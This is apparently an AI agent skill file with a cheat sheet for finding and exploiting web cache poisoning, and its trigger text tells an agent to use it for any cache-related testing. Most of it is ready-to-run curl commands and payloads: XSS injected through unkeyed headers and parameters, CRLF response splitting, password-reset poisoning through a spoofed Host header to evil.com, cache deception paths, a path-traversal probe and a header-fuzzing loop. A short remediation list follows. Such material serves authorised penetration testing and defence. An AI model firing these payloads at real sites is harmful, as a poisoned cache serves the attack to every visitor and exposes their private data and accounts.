---
name: cache-poisoning
description: >
  Expert guidance for finding, exploiting, and remediating web cache poisoning vulnerabilities.
  Covers HTTP header injection into cache, unkeyed header abuse, cache key manipulation, fat GET
  poisoning, cache deception, parameter cloaking, per-host poisoning, response splitting, cache
  timing attacks, and CDN-specific bypasses. Use this skill whenever the user mentions web cache
  poisoning, cache deception, unkeyed headers, HTTP cache manipulation, CDN poisoning, Varnish/
  Squid/CloudFront/Fastly/Nginx cache attacks, cache key flaws, X-Forwarded-Host abuse, Host
  header injection via cache, parameter cloaking, or web cache exploits. Also trigger for
  "how do I test cache poisoning", "poison CDN cache", "unkeyed header attack", "cache deception
  attack", "Host header injection cache". Always use this skill for cache-related security testing.
---

# Web Cache Poisoning Skill

Cache poisoning stores a malicious response in a cache, which is then served to all subsequent
users who request the same cache key. The impact scales from XSS to DoS to credential theft.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Unkeyed header poisoning (X-Forwarded-Host) | §3.1 |
| Host header cache poisoning | §3.2 |
| Unkeyed query parameter poisoning | §3.3 |
| Fat GET cache poisoning | §3.4 |
| Cache key normalization flaws | §3.5 |
| Parameter cloaking | §3.6 |
| Cache deception | §3.7 |
| HTTP response splitting | §3.8 |
| Per-host / routing poisoning | §3.9 |
| Cache timing / probing | §3.10 |
| CDN-specific techniques | §3.11 |

---

## 2. Core Concepts

- **Cache key** — The set of request components (URL, Host, headers) that identify a cached entry.
- **Unkeyed input** — Request data the server uses but the cache ignores (e.g., `X-Forwarded-Host`).
- **Poisoning** — Injecting malicious content into the cache entry via unkeyed input.
- **Cache deception** — Tricking the cache into storing a victim's private response.
- **Hit/Miss detection** — `X-Cache: HIT` or `Age:` header indicates a cached response.

---

## 3. Attack Techniques

### 3.1 Unkeyed Header Poisoning

The most common cache poisoning vector. The server uses the header in its response, but the cache
doesn't include it in the cache key — so everyone gets the poisoned response.

```bash
# Step 1: Detect unkeyed headers — send header and check if reflected in response
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" -I
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"

# Common unkeyed headers to test:
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Scheme: http   (downgrade HTTPS → HTTP)
X-Forwarded-Proto: http
X-Forwarded-For: 127.0.0.1

# Step 2: If reflected, try to poison with script injection
curl -s "https://target.com/" \
     -H 'X-Forwarded-Host: evil.com"></script><script>alert(1)</script>' \
     | grep evil

# Step 3: Confirm cache is being poisoned
# Send with header → get HIT response without header (different client)
# First request (with malicious header):
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" -D - | grep -E "X-Cache|Age|CF-Cache"

# Second request (no header — simulates victim):
curl -s "https://target.com/" -D - | grep -E "X-Cache|Age"
# If response still contains evil.com → POISONED!
```

---

### 3.2 Host Header Cache Poisoning

```bash
# If the app uses Host header in response and cache keys only on URL:
curl -s "https://target.com/" \
     -H "Host: evil.com" \
     | grep -i "evil.com"

# Absolute URL injection
curl -s "https://target.com/" \
     -H "Host: target.com" \
     -H "X-Forwarded-Host: evil.com" \

# Password reset link poisoning via Host header
POST /forgot-password
Host: evil.com
...email=victim@target.com...

# → Password reset email sent to victim with link: http://evil.com/reset?token=...
# (See Host Header Injection — cache makes this scalable)

# Test Host header parsing flaws
Host: target.com:random_port
Host: target.com.evil.com
Host: attacker.com#target.com
```

---

### 3.3 Unkeyed Query Parameter Poisoning

```bash
# Some cache implementations ignore certain query parameters
# Cloudflare: utm_*, fbclid, gclid
# Other CDNs: _=, callback=, _ (various)

# Test if parameter is unkeyed (reflected in response but not in cache key)
curl -s "https://target.com/?utm_content=</script><script>alert(1)</script>" | grep alert
# → If reflected and cached, everyone requesting / gets the XSS

# Common ignored parameters
?utm_source=  ?utm_medium=  ?utm_campaign=  ?utm_content=  ?utm_term=
?fbclid=      ?gclid=       ?_=             ?cachebuster=
?ref=         ?source=

# Test with Param Miner (Burp extension) — automates discovery of unkeyed params

# Inject into ignored param for persistent XSS via cache
curl -s "https://target.com/?utm_source=x%27);alert(document.domain)//" | grep utm
```

---

### 3.4 Fat GET Poisoning

Some caches key only on the URL, but the server reads a POST-like body in a GET request:

```bash
# Send GET request with a body
curl -s "https://target.com/" \
     -X GET \
     -d "param=<script>alert(1)</script>" \
     -H "Content-Length: 40" \
     | grep "script"

# Or use X-HTTP-Method-Override to change perceived method
curl -s "https://target.com/api/endpoint" \
     -X POST \
     -H "X-HTTP-Method-Override: GET" \
     -d "injected=<script>alert(1)</script>"
```

---

### 3.5 Cache Key Normalization Flaws

```bash
# Different URL representations map to same cache key:
https://target.com/path?a=1&b=2
https://target.com/path?b=2&a=1   (parameter order)
https://target.com/PATH            (case normalization)
https://target.com/path/           (trailing slash)
https://target.com/path%2F        (encoding normalization)
https://target.com/path?.          (dot param)

# Exploit: poison cache for URL A using URL B if they share a cache key
# Server responds differently to each, but cache stores same entry

# Encoding discrepancy
# Cache sees: /path?x=1 (decoded)
# Server sees: /path?x=%3Cscript%3Ealert(1)%3C/script%3E (encoded)
curl -s "https://target.com/page?utm_content=%3Cscript%3Ealert(1)%3C/script%3E"
```

---

### 3.6 Parameter Cloaking

```bash
# Exploit parsing discrepancy between cache and server for query strings

# Ruby on Rails / PHP: duplicate parameters — last one wins
# Cache sees: ?x=1
# Server sees: ?x=injected (second value)
curl "https://target.com/?x=1&x=injected"

# Semicolon delimiter — some servers split on ; in query string
# Cache sees: ?param=value;utm_content=legit
# Server sees two params: param=value and utm_content=legit
curl "https://target.com/?param=value%3butm_content=INJECT"

# Ruby matrix params
# Cache sees: /path;param=value
# Server sees: /path with param=value in path segment
curl "https://target.com/js/app.js;param=<script>alert(1)</script>"
```

---

### 3.7 Cache Deception

Trick the cache into storing a victim's private response:

```
# Step 1: Attacker sends victim a link:
https://target.com/account/profile/nonexistent.css

# Step 2: Server returns victim's profile page (ignores /nonexistent.css)
# Cache stores it as a CSS file (static, no auth required by cache)

# Step 3: Attacker fetches the same URL — gets victim's profile!

# Conditions required:
# - App returns private data for non-existent paths in a directory
# - Cache stores responses for paths ending in static extensions
# - Cache doesn't include auth cookie/header in cache key

# Test by:
GET /account/profile/test.css    → does it return your profile?
GET /account/dashboard/test.jpg  → does it return dashboard?
GET /api/user/data/image.png     → does it return API data?
```

---

### 3.8 HTTP Response Splitting

```bash
# Inject CRLF into a header value that the app reflects
# \r\n terminates headers, allowing injection of new headers or body
curl -s "https://target.com/" \
     -H $'X-Forwarded-Host: evil.com\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>'

# URL-encoded CRLF in parameters
curl "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20malicious=1"

# HTTP/2 header injection
# H2C cleartext upgrade may allow header injection
```

---

### 3.9 Per-Host / CDN Routing Poisoning

```bash
# Different backend behavior based on Host/routing

# Vary header — determines what's included in cache key
# If Vary: Accept-Encoding — inject into Accept-Encoding
curl -s "https://target.com/" \
     -H "Accept-Encoding: gzip, <script>alert(1)</script>"

# Forward proxy cache poisoning
# If target uses internal proxy cache:
curl -s "https://target.com/" \
     -H "X-Original-URL: /admin" \
     -H "X-Rewrite-URL: /admin"

# CloudFront-specific headers (unkeyed)
X-Forwarded-Host
X-Amz-Cf-Id
CloudFront-Viewer-Country
```

---

### 3.10 Cache Timing & Detection

```bash
# Detect if a response is cached
# Look for headers:
# X-Cache: HIT / MISS
# X-Varnish: (two numbers = HIT)
# Age: (non-zero = cached)
# CF-Cache-Status: HIT
# X-Cache-Hits: 1

# Time-based detection (cache hit is faster)
time curl -s "https://target.com/page" > /dev/null
# Repeat — if second request is significantly faster → cached

# Cache busting (force uncached response for testing)
# Add unique cache buster to avoid poisoning real cache:
curl "https://target.com/?cb=$(date +%s)" -H "X-Forwarded-Host: evil.com"

# Always test with cache buster first, then verify with real URL
```

---

### 3.11 CDN-Specific Techniques

#### Cloudflare

```bash
# Unkeyed headers Cloudflare ignores by default:
X-Forwarded-For
X-Forwarded-Host (sometimes)
CF-Connecting-IP (can be spoofed from origin)

# Cache rule bypass — add path that forces cache
?__cf_email__=test     (CF strips but caches)
/path/.well-known/     (often cached)

# Cloudflare cache buster
?_cf_cache_buster=$(date +%s)
```

#### Varnish

```bash
# Varnish includes Vary header fields in cache key
# Inject into Vary-matched header
curl -H "Accept-Language: en,<script>alert(1)</script>"

# Varnish hash function — add to hash key via VCL
# Check for custom VCL that adds unkeyed inputs
```

#### Fastly

```bash
# Surrogate-Key / Cache-Tag based invalidation
# If you control surrogate key header → inject into multiple cache entries

# Fastly unkeyed by default:
Fastly-Client-IP
Fastly-FF
X-Forwarded-For
```

#### Nginx Proxy Cache

```bash
# Nginx caches based on $request_uri by default
# Vary by Host is common config mistake

# Test nginx cache path confusion
curl "https://target.com/index.php" \
     -H "X-Original-URL: ../../../../etc/passwd"
```

---

## 4. Automated Testing

```bash
# Param Miner (Burp extension) — best tool for unkeyed header/param discovery
# 1. Install from BApp Store
# 2. Right-click request → Extensions → Param Miner → Guess everything
# 3. Reviews "Output" tab for reflected unkeyed inputs

# Web Cache Vulnerability Scanner
pip install wcvs
wcvs -u "https://target.com/"

# Manual with custom wordlist
for header in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL" \
              "X-Forwarded-Server" "X-HTTP-Host-Override" "Forwarded"; do
  result=$(curl -s "https://target.com/" -H "${header}: evil.com" | grep -c "evil.com")
  [ "$result" -gt 0 ] && echo "[!] REFLECTED: ${header}"
done
```

---

## 5. Cache Poisoning Impact Levels

| Type | Impact | Scope |
|------|--------|-------|
| Reflected XSS via cache | XSS on all visitors | All cached URL visitors |
| JS resource poisoning | Full page XSS | All site visitors |
| Cache deception | Steal private data | Per victim |
| Resource DoS | Site unavailable | All users |
| Redirect poisoning | Phishing at scale | All cached URL visitors |

---

## 6. Remediation

1. **Include all security-relevant headers in cache key** — Never treat security headers as unkeyed.
2. **Disable caching for user-specific content** — Use `Cache-Control: no-store` for auth'd responses.
3. **Validate and sanitize all headers** — Don't trust proxy-added headers.
4. **CDN configuration review** — Audit what headers are excluded from cache keys.
5. **Vary header** — Ensure `Vary` includes headers that affect response content.
6. **Cache deception prevention** — Return 404 for non-existent paths; don't fall back to sensitive pages.
7. **Strip unrecognized headers** at edge before forwarding to origin.

---

## 7. Cache Poisoning Testing Checklist

- [ ] Identify cache layer (Varnish, Cloudflare, Fastly, Nginx, CDN)
- [ ] Detect cache hit/miss via `X-Cache`, `Age`, `CF-Cache-Status`
- [ ] Add cache buster param for all poisoning tests
- [ ] Test all unkeyed header candidates (X-Forwarded-Host, X-Host, etc.)
- [ ] Check if unkeyed headers are reflected in response
- [ ] Test unkeyed query parameters (utm_*, fbclid)
- [ ] Test parameter cloaking (duplicate params, semicolons)
- [ ] Test fat GET with body in GET request
- [ ] Test cache deception with static extensions on dynamic paths
- [ ] Verify poisoning persists across different clients (confirm it's cached)
- [ ] Test Host header reflection → password reset link poisoning
- [ ] Run Param Miner on all high-value cached pages
